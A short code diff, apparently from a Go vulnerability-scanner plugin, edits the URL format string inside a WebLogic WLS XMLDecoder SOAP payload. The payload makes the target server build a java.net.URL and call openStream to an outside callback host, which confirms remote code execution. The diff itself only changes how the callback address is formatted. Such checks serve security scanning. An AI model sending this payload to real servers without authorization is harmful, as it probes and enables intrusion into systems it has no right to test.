@@ -44,7 +44,7 @@ func (d *weblogicWLSRCE) Check(URL string, meta plugin.TaskMeta) bool {
       <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
         <java version="1.8" class="java.beans.XMLDecoder">
           <void class="java.net.URL">
-            <string>http://%s/add/%s</string>
+            <string>%s/add/%s</string>
             <void method="openStream"/>
           </void>
         </java>
